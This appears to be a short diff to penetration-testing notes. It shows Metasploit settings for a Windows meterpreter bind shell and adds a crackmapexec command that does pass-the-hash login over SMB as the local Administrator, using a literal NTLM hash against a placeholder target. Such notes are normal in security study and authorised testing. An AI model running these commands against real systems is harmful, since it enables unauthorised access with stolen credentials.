@@ -51,4 +51,6 @@
 > set payload windows/x64/meterpreter/bind_tcp  
 > set lhost ***[OWN IP]***  
 > run
+##### from bash
+> crackmapexec smb ***[TARGET IP]*** -u "Administrator" -H 5835048ce94ad0564e29a924a03510ef --local-auth  
 
